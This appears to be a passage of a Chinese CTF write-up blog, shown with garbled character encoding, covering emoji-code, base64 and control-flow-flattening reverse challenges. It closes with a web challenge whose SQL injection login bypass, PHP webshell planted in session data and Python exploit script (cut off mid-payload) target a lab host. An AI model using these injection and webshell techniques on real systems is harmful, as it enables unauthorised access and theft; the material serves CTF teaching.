id="è§£é¢˜äººè§†è§’"><a href="#è§£é¢˜äººè§†è§’" class="headerlink" title="è§£é¢˜äººè§†è§’"></a>è§£é¢˜äººè§†è§’</h4><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4br2deatj61ds0astb902.jpg" alt=""></p><p>binwalk -e åˆ†ç¦»å‡ºä¸€ä¸ªå‹ç¼©åŒ…ï¼Œé‡Œé¢ä¿©æ–‡ä»¶ï¼Œå…ˆfileä¸€ä¸‹çœ‹çœ‹éƒ½æ˜¯å•¥</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4brvm8d1j60mm03wt9602.jpg" alt=""></p><p>éƒ½æ˜¯æ–‡æœ¬æ–‡ä»¶ï¼Œç”¨codeæ‰“å¼€åº·åº·</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4bslwkyjj60g20a4t8t02.jpg" alt=""></p><p>hint.txtå¦‚ä¸Š</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4bt5j38aj61nc0c840b02.jpg" alt=""></p><p>flag.emojicæ–‡ä»¶å¦‚ä¸Šï¼Œä¹ä¸€çœ‹æ˜¯emojiç¼–ç ï¼Œå‘ç°è§£ä¸åŠ¨ï¼Œæœä¸€ä¸‹hint</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4bus5qpwj619q0u0jwr02.jpg" alt=""></p><p>å‘ç°emojicodeï¼Œæ˜¯ä¸€ç§ç¼–ç¨‹è¯­è¨€</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4bwhh0blj61gs0u00yx02.jpg" alt=""></p><p>è¿™ä¸€å¨ä¸œè¥¿ç¿»è¯‘æˆpythonå°±æ˜¯å¦‚å›¾æ‰€ç¤ºï¼Œå°±å®šä¹‰äº†ä¸€ä¸ªåˆ—è¡¨ï¼ŒğŸ˜€ æ˜¯è¾“å‡ºï¼ŒğŸ½æ˜¯è®¿é—®é›†åˆä¸­å…ƒç´ ï¼Œå¾ˆç®€å•ï¼Œç¨å¾®è¯»è¯»æ–‡æ¡£å°±çŸ¥é“å’‹å›äº‹äº†ã€‚</p><p>é‚£çœ‹æˆ‘ä»¬çš„æºä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ğŸ ğŸ‡</span><br><span class="line">  ğŸ¿ ğŸ”¤ğŸ˜¼ğŸ‘¿ğŸ‡ğŸšğŸ‘­ğŸ‡ğŸ“«â™£ğŸ˜”ğŸ¡ğŸ¨ğŸ˜¼ğŸ”…ğŸ‘¯ğŸ™ğŸ’˜ğŸ“‡ğŸ“ºğŸ’¡ğŸ‘®ğŸ‰ğŸ‘´ğŸ“¨ğŸ˜ğŸ‘–ğŸ“ğŸ”¤ ğŸ”¤â›½â™¨ğŸ‘¹ğŸŒ…ğŸ¥ğŸ‡â˜ğŸ“ºğŸ—½ğŸ’°ğŸ¯ğŸ›ğŸ“ğŸ“›ğŸ“ğŸ¸ğŸŒ†ğŸ’ğŸğŸŒğŸ’ªğŸ˜´ğŸš¢ğŸ‡ğŸ˜˜ğŸ‘˜ğŸ”¤ ğŸ”¤ğŸ‘ğŸ‘£ğŸ‘˜ğŸ‘ğŸ‘²ğŸ‘°ğŸ§ğŸ‘¬ğŸ‘–ğŸ‘˜ğŸ‘©ğŸªğŸ‘–ğŸ‘œğŸ‘¤ğŸ§ğŸ‘¡ğŸ¨ğŸ‘–ğŸ‘¤ğŸ‘˜ğŸ‘ªğŸ‘«ğŸªğŸ‘©ğŸ‘´ğŸ”¤ ğŸ”¤ğŸ˜¿ğŸ‘‚ğŸ—¾ğŸ²ğŸ“¤ğŸš£ğŸ“â˜ğŸ°ğŸ³âœ‹ğŸ©â›ºğŸ’™ğŸ›€ğŸµğŸ˜¾âœŠğŸ‘¯ğŸ””ğŸªğŸ”®ğŸŒŒğŸŒ‚ğŸ˜‰ğŸŒ»ğŸ”¤ ğŸ”¤ğŸ˜³ğŸ”ğŸ¡ğŸ®â™ ğŸ“·ğŸ‘·ğŸŒ·ğŸ‹ğŸƒğŸ’‚ğŸ‘²âŒ›ğŸ“Œâ˜•ğŸªğŸš—ğŸŒ´ğŸ‘ğŸ’¶ğŸ”®ğŸ“²ğŸ˜¼â˜‚ğŸŒğŸ¢ğŸ”¤ ğŸ”¤ğŸ’œğŸ˜±â›³ğŸ«ğŸ“¡ğŸš¥ğŸ™ğŸ“”ğŸ“ŒğŸ™†ğŸ»ğŸ£â¿ğŸŠğŸ·ğŸâ˜ğŸ»ğŸ’ğŸ˜ğŸ˜ğŸ¬ğŸ’¶ğŸš¥ğŸ¼ğŸ‘…ğŸ”¤ ğŸ”¤ğŸ˜»ğŸğŸš“ğŸ’ğŸ’¨â³ğŸ’šğŸš¬ğŸ‹ğŸ¡ğŸ’ğŸ‘ğŸ˜¹ğŸ”ğŸ˜³ğŸ‘±ğŸ‚ğŸğŸ™ğŸğŸ€ğŸ¼ğŸ¸ğŸ‘…ğŸ”•ğŸ“€ğŸ”¤ ğŸ”¤ğŸ“ â™¥ğŸ¶ğŸ”‘âŒšğŸ˜Ÿâ“ğŸ â™¨ğŸ‘œğŸ¹ğŸ€ğŸ˜©ğŸ‘¡ğŸ’ğŸ‘¶ğŸ ğŸŒšğŸ©ğŸ‘¸ğŸ¹ğŸ“»ğŸ€ğŸ›â”ğŸ“¦ğŸ”¤ ğŸ”¤ğŸ‘‡ğŸ¦ğŸŒ˜ğŸ‘ğŸ’·ğŸ’§ğŸ“ğŸ‘¦ğŸ‘ğŸ‚ğŸğŸ’´ğŸ˜‡ğŸ„â°ğŸ’¶ğŸ’ƒğŸ…ğŸŒ—â—ğŸ“£ğŸ”°ğŸ†âš½ğŸ˜ŸğŸ“¢ğŸ”¤ ğŸ”¤ğŸ˜¥â™ ğŸ•ğŸ™ŒğŸ‡ğŸ™ŠğŸ˜³ğŸ…âš“ğŸ‹ğŸŒœâ™¨ğŸ˜µğŸ”‡ğŸ¬ğŸ¥ğŸ˜¬ğŸğŸ“„ğŸ¯ğŸ¶âš ğŸ“ğŸŒ½ğŸ“¦ğŸ—ğŸ”¤ ğŸ”¤ğŸ·ğŸ¦ğŸšğŸ†ğŸºğŸ“ªğŸšğŸ‹ğŸ«ğŸ‘ğŸ˜¥ğŸšŒğŸ­ğŸŒğŸ‘ªğŸ’ªğŸ±ğŸ“†ğŸ›â›µğŸ”–ğŸ˜±ğŸ™ğŸğŸ«ğŸğŸ”¤ ğŸ”¤ğŸ‘¥ğŸ“¯ğŸ”ğŸ“ğŸ‰ğŸ™‡â­âœ‹ğŸâ„ğŸšğŸ‘©ğŸšğŸ²ğŸš€â—â˜‚ğŸ‹âœ‚ğŸ”âœ‹ğŸ‘³ğŸ•ğŸ­ğŸš‘ğŸ’ğŸ”¤ ğŸ”¤ğŸ“•ğŸŒºğŸ¡ğŸ™†ğŸŒğŸ˜—ğŸ‘•ğŸ†â™£ğŸŠğŸ‘¦ğŸ˜²ğŸ€ğŸ’‘ğŸ«ğŸ‘±ğŸ“ŠğŸŒ„ğŸŒğŸ©ğŸ¢ğŸ¬ğŸ˜´ğŸ´ğŸ“›ğŸ¦ğŸ”¤ ğŸ”¤ğŸ˜°ğŸ‘¡ğŸˆğŸğŸ”‰ğŸšğŸ”ŒğŸğŸ”ŒğŸ“£ğŸ™‹â›³ğŸ˜’ğŸğŸšªğŸŒğŸ‘¯ğŸ’°ğŸ˜‚â—ğŸ’—ğŸš¤ğŸ’ˆğŸ“ğŸ·ğŸ”ğŸ”¤ ğŸ”¤ğŸ•ğŸ‚ğŸ¶ğŸš¡ğŸšŒğŸ˜¯ğŸğŸ’ƒğŸğŸ…ğŸ¥ğŸ¬ğŸ‘‰ğŸ£ğŸ‘¨ğŸ¨ğŸ“¤ğŸ›ğŸ‘°ğŸšŒğŸğŸ‰ğŸŒ¹ğŸ“¯ğŸš™ğŸ”ğŸ”¤ ğŸ”¤ğŸ¤ğŸšğŸ˜ ğŸ“•ğŸ“ğŸ™ŠğŸ‘ğŸ”¨ğŸ–ğŸ‘‡ğŸ‘“ğŸ‘ğŸŒ…ğŸ’ƒğŸ¨ğŸ¿ğŸ˜ºğŸŒğŸ’…âš¡ğŸ“«ğŸ‘šğŸ‘¢ğŸˆğŸšğŸ”’ğŸ”¤ ğŸ”¤ğŸ¯ğŸŠğŸŒğŸ“¬ğŸğŸ¬ğŸ‘ ğŸ“²ğŸğŸ˜ªğŸ’šğŸ‘¶ğŸ«ğŸ„ğŸŒğŸ‘²ğŸ“ŸğŸ’«ğŸ“ğŸ˜¥ğŸ˜¾ğŸ˜‚ğŸŒ¾ğŸ‘‘ğŸ†ğŸ ğŸ”¤ ğŸ”¤ğŸ‘ğŸ°ğŸ‘§ğŸ‘†ğŸ¼ğŸ‘¡ğŸ—»â—ğŸ©ğŸ“™ğŸ“„ğŸ’ğŸ£ğŸš—ğŸ“¢ğŸ“•ğŸ“ƒâ˜ğŸ’ğŸ€„ğŸğŸ˜ŠğŸ”®ğŸ‘¿ğŸ‘œğŸ‘ğŸ”¤ ğŸ”¤âœŒğŸ‘ğŸš™ğŸš‹ğŸ‰ğŸ”“ğŸ˜¸ğŸ”¥ğŸ“ğŸ ğŸ“ğŸ©ğŸ“‚ğŸ“’â¿ğŸ™ğŸ‘„ğŸ¹ğŸ’ğŸ˜ğŸ©ğŸ‘¥ğŸ”‹ğŸ°ğŸ¸ğŸš²ğŸ”¤ ğŸ”¤ğŸ‘²ğŸ’ƒğŸ’‹ğŸ’§ğŸ˜¥ğŸ™€â™¦ğŸš´ğŸ³ğŸ˜‰ğŸŒ±ğŸğŸ’—ğŸ˜ºğŸ˜¿ğŸ‡ğŸ˜ğŸ‘‡ğŸ«ğŸ˜„ğŸ•â˜ğŸ˜°ğŸš¢â›½ğŸŒœğŸ”¤ ğŸ”¤ğŸ‘¾ğŸ—½ğŸŒğŸŠâ›½ğŸ˜ªğŸ˜®ğŸ“ ğŸ˜¢ğŸœğŸ˜„ğŸ˜±ğŸ˜ğŸ“œğŸ¢ğŸºğŸ·ğŸ¦ğŸ‘ŠğŸŒğŸ’‚ğŸğŸ‘‹ğŸ¼ğŸ¡ğŸ”®ğŸ”¤ ğŸ”¤ğŸ‘…ğŸŒŒâ›½ğŸŒ‹ğŸ–ğŸ”’ğŸ”’ğŸœğŸ—ğŸ«ğŸ™ğŸ¤ğŸ””â˜ğŸ“ŠğŸ“¹ğŸ˜ğŸ“–ğŸŸâœ¨ğŸ’”ğŸ‘ŠğŸ‘»ğŸ“œğŸ¬ğŸ£ğŸ”¤ ğŸ”¤ğŸ’˜ğŸ““ğŸµğŸ’€ğŸ¹âœŠğŸ”ŒğŸŒ¼ğŸ”‹ğŸ˜–ğŸŒ“ğŸ’ğŸ«ğŸ“ğŸƒğŸ‘¥â›³ğŸ™€ğŸ‰ğŸœğŸ˜ŒğŸ“ğŸ‘œğŸ™€ğŸ‚ğŸ‘„ğŸ”¤ ğŸ”¤ğŸ‘¡ğŸ‘°ğŸğŸ’ªğŸ“ğŸğŸ‘†ğŸ˜ğŸ‘§ğŸ¥ğŸ“ğŸ‘±ğŸğŸ˜ŠğŸš–â˜ºğŸŒ“ğŸš¢ğŸˆğŸ‹ğŸŒ½ğŸ˜“ğŸ·ğŸğŸ»â›ºğŸ”¤ ğŸ”¤â˜ğŸ’’ğŸ˜ƒğŸ‘ ğŸ‘—ğŸ‘‡ğŸ†ğŸŒ†âš ğŸš”ğŸ˜·ğŸºğŸ¥ğŸ™ğŸŒˆğŸ‘¾ğŸ‘ğŸ˜¯ğŸ‹ğŸ”‹ğŸ’„â˜•ğŸ’”ğŸœğŸ˜ğŸ’ªğŸ”¤ ğŸ”¤ğŸŒ¸ğŸ³ğŸ’¡ğŸ“ğŸ¹ğŸ˜†ğŸ“â˜€ğŸ‘—ğŸš§ğŸš¢ğŸ”ğŸ”ŒğŸ˜¨ğŸ“·ğŸ‘³ğŸ’§ğŸ¾ğŸğŸ”•ğŸğŸ‘ªğŸš’ğŸ¸ğŸ”®ğŸ‘¨ğŸ”¤ ğŸ”¤ğŸºğŸ‡ğŸ‘”ğŸ€ğŸŒ›ğŸ¡ğŸ±ğŸš‰ğŸ˜£â™ ğŸ‘ğŸš‚ğŸ™‹â˜ğŸš…ğŸŒˆğŸŒ‹ğŸ“†ğŸ™ğŸ™‰ğŸ‘¨ğŸ²ğŸ“™ğŸ’âœ‹ğŸ©ğŸ”¤ ğŸ”¤ğŸ“ğŸƒğŸ“ğŸŒ‡ğŸğŸŒ¹â˜ğŸ»ğŸ§ğŸ˜ªğŸƒğŸ’³ğŸ’°ğŸğŸ‘‡ğŸŸğŸ™‡ğŸ˜±ğŸ“¡ğŸ‘ğŸ‘„ğŸ“ğŸ”ªâ˜ğŸ’¬â­ğŸ”¤ ğŸ”¤ğŸ’‰ğŸŒ™â˜€ğŸ“­ğŸ“¨ğŸ‘‹ğŸŒ†ğŸšğŸ’˜ğŸ’»ğŸ˜„ğŸ’©ğŸ”‹ğŸŸğŸ”ˆğŸ“¢ğŸ‘ğŸŒ–ğŸ“ŒğŸ²ğŸ’•ğŸ›â•ğŸ·ğŸ€ğŸ¸ğŸ”¤ ğŸ”¤ğŸ¤ğŸ‘«ğŸš ğŸ’¨ğŸ“–ğŸš¦ğŸ”‘ğŸ“¥ğŸ”ªğŸˆğŸš’ğŸ’ŒğŸŒ´ğŸ‘ªğŸ˜¦ğŸ™‡ğŸŒğŸ“˜ğŸ˜ğŸ˜ğŸ‘²ğŸ¸ğŸ™â˜ğŸ¨ğŸ˜¸ğŸ”¤  ğŸ† â¡ï¸ list</span><br><span class="line">  ğŸ’­ ğŸ˜€ ğŸ½list 2â—ï¸â—ï¸</span><br><span class="line">ğŸ‰</span><br></pre></td></tr></table></figure><p>ä¸¤ä¸ªğŸ”¤ğŸ”¤ä¸­é—´è·Ÿçš„æ˜¯å¸¸é‡ï¼Œæ‰€ä»¥è¿™ä¸­é—´çš„ä¸€å †emojiå°±æ˜¯å­—ç¬¦ä¸²ï¼Œç„¶ååé¢è®¿é—®äº†list[2]è¿™ä¸ªå…ƒç´ ï¼Œå¯ä»¥ä¸‹è½½emojicodeç„¶åç¼–è¯‘è·‘ä¸€éï¼Œä½†æ˜¯æ²¡æœ‰è¾“å‡ºï¼Œå› ä¸ºå¤šäº†ä¸€ä¸ªğŸ’­</p><p><a href="https://www.emojicode.org/docs/reference/basics.html">https://www.emojicode.org/docs/reference/basics.html</a></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4c1th4pnj61n30u0q7v02.jpg" alt=""></p><p>å…¶å®å°±æ˜¯ä¸ªæ³¨é‡Šï¼Œå»æ‰å³å¯</p><p>æœ¬è´¨å°±æ˜¯è®¿é—®åˆ—è¡¨ä¸­çš„2å·å…ƒç´ ï¼Œæ‹¿å‡ºæ¥æ˜¯è¿™ä¸ªä¸œè¥¿ğŸ‘ğŸ‘£ğŸ‘˜ğŸ‘ğŸ‘²ğŸ‘°ğŸ§ğŸ‘¬ğŸ‘–ğŸ‘˜ğŸ‘©ğŸªğŸ‘–ğŸ‘œğŸ‘¤ğŸ§ğŸ‘¡ğŸ¨ğŸ‘–ğŸ‘¤ğŸ‘˜ğŸ‘ªğŸ‘«ğŸªğŸ‘©ğŸ‘´</p><p>emoji decodeè§£ä¸€ä¸‹è·å¾—flag ç½‘å€ï¼š<a href="http://www.atoolbox.net/Tool.php?Id=937">http://www.atoolbox.net/Tool.php?Id=937</a></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4c3e2luej61d80u0wgn02.jpg" alt=""></p><p>å½“ç„¶ä¹Ÿå¯ä»¥å»æ‰æ³¨é‡Šï¼Œç„¶åç¼–è¯‘ä¸€ä¸‹ï¼Œç„¶åå†å»emojiè§£ç </p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4c5do0z5j60le08sgn202.jpg" alt=""></p><p>flag{y0u_ar3_em0j1_mast3r}</p><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="dragon"><a href="#dragon" class="headerlink" title="dragon"></a>dragon</h3><p>flag{l3m0n_l0v3_bas364}</p><p>æœ€åŸºæœ¬çš„base64ä»£ç ï¼Œä¸è¿‡æ¢äº†ä¸ªè¡¨ï¼Œè§£ç å°±å¥½</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">table = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&quot;</span></span><br><span class="line">old_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">flag1 = <span class="string">&quot;zMXHz3TSm20WBL9SmhyZx2jHCZm2nh0=&quot;</span></span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(flag1.translate(<span class="built_in">str</span>.maketrans(table,old_table)))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv5f6t4phxj60ry0cwdhj02.jpg" alt=""></p><h3 id="equation"><a href="#equation" class="headerlink" title="equation"></a>equation</h3><p>2020ç¾ŠåŸæ¯åŸé¢˜ï¼Œåªä¸è¿‡å»æ‰äº†pycåç¼–è¯‘çš„è¿‡ç¨‹ï¼ŒåŸé¢˜é“¾æ¥ï¼š<a href="https://la13x.github.io/2021/04/16/buuctf-reverse1/#1-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-login">https://la13x.github.io/2021/04/16/buuctf-reverse1/#1-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-login</a></p><p>flag{58964088b637e50d3a22b9510c1d1ef8}</p><h3 id="flattening"><a href="#flattening" class="headerlink" title="flattening"></a>flattening</h3><h4 id="å‡ºé¢˜äººè§†è§’-1"><a href="#å‡ºé¢˜äººè§†è§’-1" class="headerlink" title="å‡ºé¢˜äººè§†è§’"></a>å‡ºé¢˜äººè§†è§’</h4><p>WDNMD çœŸéš¾ç¼–è¯‘ï¼Œå‡ºè¿™ä¸ªé¢˜è®©ğŸ‘´ğŸ»çŸ¥é“äº†ç¼–è¯‘ä¸æ˜¯é äººå“</p><p><img src="/Users/lemon/Library/Application%20Support/typora-user-images/image-20211005213507923.png" alt=""></p><p>gccå’Œg++è¦åˆ‡åˆ°8.xç‰ˆæœ¬æ‰è¡Œï¼Œç„¶åè¦æ”¹ä¸ªå•¥æ–‡ä»¶æ¥ç€charæ”¹ä¸ºuint_8å¥½åƒæ˜¯ï¼Œä¸ç®¡äº†ï¼Œåæ­£ğŸ‘´ğŸ»ç¼–å¥½äº†ï¼Œæ€»ä¹‹å°±æ˜¯å¾ˆæ°´çš„ä¸€ä¸ªé¢˜ï¼ŒçŸ¥é“æ··æ·†æŠ€æœ¯äº†é‚£å°±æ˜¯ç™½ç»™é¢˜ï¼Œåæ­£ğŸ‘´ğŸ»æ˜¯ğŸ‘£æœ¬å°å­ï¼ŒğŸ‘´ğŸ»åªä¼šç”¨å·¥å…·å»æ··æ·†ï¼ŒğŸ‘´ğŸ»è¿˜æœ‰å¾ˆå¤šä¸œè¥¿è¦å­¦</p><h4 id="è§£é¢˜äººè§†è§’-1"><a href="#è§£é¢˜äººè§†è§’-1" class="headerlink" title="è§£é¢˜äººè§†è§’"></a>è§£é¢˜äººè§†è§’</h4><p>idaèµ°ä¸€æ³¢</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4rpaar0aj314f0u0tap.jpg" alt=""></p><p>WDNMDï¼Œæ„è¯†åˆ°å¹¶ä¸ç®€å•ï¼Œçœ‹çœ‹CFG</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4rpr6j8mj618d0u0go702.jpg" alt=""></p><p>è¡€å‹ä¸Šæ¥äº†ï¼Œä½†æ˜¯é—®é¢˜ä¸å¤§ï¼Œæ§åˆ¶æµå¹³å¦åŒ–ï¼Œå‚è§è¿™ä¸ªï¼š<a href="https://la13x.github.io/2021/04/18/hardCpp/">https://la13x.github.io/2021/04/18/hardCpp/</a></p><p>ç”¨deflatä¸€æŠŠæ¢­ï¼Œå…ˆæ‰¾æ‰¾å…¥å£åœ°å€</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4rox99y0j30cs05umxr.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4rom2dzkj313c0asjug.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4rsecpypj30k40qwjs6.jpg" alt=""></p><p>èˆ’æœäº†</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4rsv20vlj315o0iwacm.jpg" alt=""></p><p>ä»€ä¹ˆç™½ç»™ç­¾åˆ°é¢˜ğŸ˜…</p><p>ç›´æ¥åœ¨dataæ®µæ‰¾åˆ°keyæ¯ä¸ªå€¼å¼‚æˆ–0x37å°±å‡ºäº†</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4s3b74hkj614c0u0tan02.jpg" alt=""></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> key[] =</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">7</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">67</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">7</span>,</span><br><span class="line">    <span class="number">123</span>,</span><br><span class="line">    <span class="number">104</span>,</span><br><span class="line">    <span class="number">81</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">7</span>,</span><br><span class="line">    <span class="number">64</span>,</span><br><span class="line">    <span class="number">104</span>,</span><br><span class="line">    <span class="number">81</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">86</span>,</span><br><span class="line">    <span class="number">67</span>,</span><br><span class="line">    <span class="number">67</span>,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">94</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">80</span>,</span><br><span class="line">    <span class="number">104</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">68</span>,</span><br><span class="line">    <span class="number">104</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    <span class="number">86</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">78</span>,</span><br><span class="line">    <span class="number">104</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">67</span>,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    <span class="number">68</span>,</span><br><span class="line">    <span class="number">67</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">80</span>,</span><br><span class="line">    <span class="number">55</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(key)/<span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, key[i]^<span class="number">0x37</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4s5ucmtgj30ik05owf4.jpg" alt=""></p><p>flag{C0ntr0L_f10w_f1att3ning_1s_r3a11y_1nt3r3st1ng}</p><h1 id="wp-by-Sparta-EN"><a href="#wp-by-Sparta-EN" class="headerlink" title="wp by Sparta_EN"></a>wp by Sparta_EN</h1><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>æ ¹æ®æè¿° ç›´æ¥åœ¨ CTFd é¡µé¢æŸ¥çœ‹æºç </p><p><img src="https://i.loli.net/2021/10/05/f9hUnSqNLdQjtcZ.png" alt="image.png"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Simple-PHP"><a href="#Simple-PHP" class="headerlink" title="Simple PHP"></a>Simple PHP</h3><p><code>www.zip</code> è·å–æºç  <code>debug_only/infoinfoinfome.php</code> æŸ¥çœ‹PHPInfo</p><p>ç›´æ¥çœ‹æºç  SQL æ²¡åšè¿‡æ»¤ï¼Œä½¿ç”¨äº† <code>password_hash()</code>å¯¹å¯†ç å– hash</p><p>æ„é€  Payload  <code>username=&#39; UNION SELECT 1337, &#39;testuser&#39;, &#39;$2y$10$CkDlt51VAEIFDp5A8YVft.rzVRjuHhe9YzYI1Cug0nwJzmamvx1EK&#39;, &#39;&#39; -- &amp;password=passw0rd</code> è¿™é‡Œçš„ hash å³ <code>passw0rd</code>çš„ hash æ ¹æ®ç™»é™†é¡µé¢çš„ hint, id å– 1337 å¯ä»¥é€šè¿‡ç™»å…¥åçš„ check </p><p>ç™»å…¥åå‘ç°æˆ‘ä»¬å¯ä»¥æ›´æ–°ç”¨æˆ·æ•°æ®ï¼Œå‚è€ƒæºç  æˆ‘ä»¬å‘ç°è¿™ä¸ªåº”ç”¨ä¼šæŠŠç”¨æˆ·æ•°æ®åºåˆ—åŒ–åå†™å…¥ SESSION</p><p><img src="https://i.loli.net/2021/10/05/3r61PvY8tMGQIdo.png" alt="image.png"></p><p>è€Œä¸” <code>index.php</code>åšäº†ä¸€ç³»åˆ—çš„æ£€æŸ¥ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤ session æ–‡ä»¶ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ›´æ–°ç”¨æˆ·ä»»æ„å­—æ®µ(å¯†ç é™¤å¤–)ä¸ºä¸€å¥è¯æœ¨é©¬</p><p>ç»“åˆ phpinfo(); çš„ç»“æœï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¼šè¯è·¯å¾„ä¸º <code>/var/lib/php/sessions</code></p><p>å³å¯è¿›è¡Œä¼šè¯åŒ…å«ã€‚å‘ç° flag ä¸º <code>/flag-&lt;éšæœºå­—ç¬¦&gt;</code>ï¼Œ<code>cat</code>ä¸‹è¯»å‡ºå³å¯ã€‚</p><p><img src="https://i.loli.net/2021/10/06/sydojEwr7TC2bGc.png" alt="image.png"></p><p>é™„ EXP</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">sess = requests.session()</span><br><span class="line"><span class="comment"># password=test&amp;username=123%27%20UNION%20SELECT%201,%27test%27,%27$2a$12$QBE87yzDmO9BEq1JWZq1eODkoVzbk6mQ0nyU400CB90Vz8SSi9b2m%27,%27%27%20+--+</span></span><br><span class="line">target = <span class="string">&quot;http://152.136.99.28:30166/&quot;</span></span><br><span class="line">session_path = <span class="string">&quot;/var/lib/php/sessions/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># passw0rd</span></span><br><span class="line"><span class="comment"># $2y$10$CkDlt51VAEIFDp5A8YVft.rzVRjuHhe9YzYI1Cug0nwJzmamvx1EK</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;&#x27; UNION SELECT 1337, &#x27;testuser&#x27;, &#x27;$2y$10$CkDlt51VAEIFDp5A8YVft.rzVRjuHhe9YzYI1Cug0nwJzmamvx1EK&#x27;, &#x27;&#x27; -- &quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;passw0rd&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Trying to auth with sql injection&quot;</span>)</span><br><span class="line"></span><br><span class="line">r = sess.post(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/login.php&quot;</span>, data=payload, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">session_id = r.cookies.get(<span class="string">&quot;PHPSESSID&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">f&#x27;[*] Session ID: <span class="subst">&#123;session_id&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> r.status_code != <span class="number">302</span>:</span><br><span class="line">    print(<span class="string">&quot;[!] Auth failure!&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;[+] Updating user info with malicious data&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;passw0rd&quot;</span>,</span><br><span class="line">    <span class="comment"># Where the magic happens</span></span><br><span class="line">    <span class="string">&quot;description&quot;</span>: <span 